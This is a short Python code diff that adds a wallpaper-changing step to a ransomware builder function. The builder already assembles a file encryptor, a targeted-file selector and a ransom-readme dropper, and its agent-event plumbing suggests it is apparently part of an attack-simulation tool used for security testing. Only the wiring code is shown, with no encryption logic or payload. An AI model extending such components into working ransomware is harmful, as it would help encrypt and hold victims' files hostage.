@@ -14,6 +14,7 @@ from .ransomware import Ransomware
 from .ransomware_options import RansomwareOptions
 from .readme_dropper import ReadmeDropper
 from .targeted_file_extensions import TARGETED_FILE_EXTENSIONS
+from .wallpaper_changer import WallpaperChanger
 
 CHUNK_SIZE = 4096 * 24
 
@@ -31,12 +32,14 @@ def build_ransomware(
     file_encryptor = _build_file_encryptor(internal_ransomware_options.file_extension)
     file_selector = _build_file_selector(internal_ransomware_options.file_extension)
     leave_readme = _build_leave_readme()
+    change_wallpaper = _build_change_wallpaper()
 
     return Ransomware(
         internal_ransomware_options,
         file_encryptor,
         file_selector,
         leave_readme,
+        change_wallpaper,
         agent_event_publisher,
         agent_id,
     )
@@ -58,3 +61,7 @@ def _build_file_selector(file_extension: str):
 
 def _build_leave_readme():
     return ReadmeDropper(get_os()).leave_readme
+
+
+def _build_change_wallpaper():
+    return WallpaperChanger(get_os()).change_wallpaper
